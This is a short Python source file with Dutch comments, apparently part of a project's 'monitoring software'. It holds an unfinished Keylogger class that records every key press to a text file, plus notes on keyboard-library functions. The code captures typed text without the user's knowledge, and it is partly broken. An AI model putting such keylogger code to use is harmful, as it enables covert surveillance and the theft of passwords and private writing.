########################################################################################################################
#               Dit is het bestand voor de keystrokes en clipboard logger delen.                                       #
#               Probeer zoveel mogelijk code in functies/classes te plaatsen i.p.v. los.                               #
#               De code in dit bestand wordt geïmporteerd naar monitorings_software.py.                                #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Hier alle library imports
import keyboard as kb

# Hieronder de relevante code


class Keylogger:
    def __init__(self):
        self.is_active = True
        self.events_queue = []
        self.relevant_keys = []

    def activate_keylogger(self, text_file):
        self.is_active = True

    def deactivate_keylogger(self):
        self.is_active = False

    def start_logging_keys(self, text_file):
        self.events_queue = kb.start_recording()  # Begin met opnemen aan het begin van het opstarten van programma.
        while True:
            press_events, release_events = self.events_queue
            while not press_events.empty():
                event = press_events.get()
                if event.event_type == 'down':
                    self.relevant_keys.append(event)
                    text_file.write(str(event) + '\n')


def main():
    """Tijdelijk de mogelijkheden van de kb library i.v.m. dat we nog niet weten hoe precies op te slaan.
    Poging tot het registreren van keys en het opslaan hiervan in een tekstbestand.

    Args:
        template_naam (type): Korte uitleg

    Returns:
        type: korte uitleg

    Bronnen:
        https://github.com/boppreh/keyboard#keyboard.get_typed_strings ==> keyboard library
        https://www.thepythoncode.com/article/control-keyboard-python ==> template / ideeën voor keylogger code
    """
    # [V] kb.start_recording() en recording = kb.stop_recording()
    # [V] events = keyboard.record('esc') ==> opnemen keypresses
    # [~] kb.is_modifier(key) ==> geeft aan of meegegeven key modifier is.
    # [~] print(list(kb.get_typed_strings(events))) ==> Print geen hotkeys.
    # [X] keyboard.play(events) ==> opnieuw afspelen keypresses
    # [X] kb.send((hot)key(s)) ==> Voert hotkey(s) uit
    # [X] kb.add_hotkey("hotkeys", lambda: functie()) ==> voert functie uit wanneer hotkey activeert.
    # [X] kb.is_pressed('ctrl') ==> controleert op specifieke key, wrs onnodig
    # [X] kb.write("string", delay=0.0) ==> Print string (bij eindgebruiker, niet in .txt)
    # [X] kb.block_key(key) ==> blokkeert gebruik van key.
    # [X] kb.remap_key(src,dst) ==> src omzetten naar dst


if __name__ == '__main__':
    main()
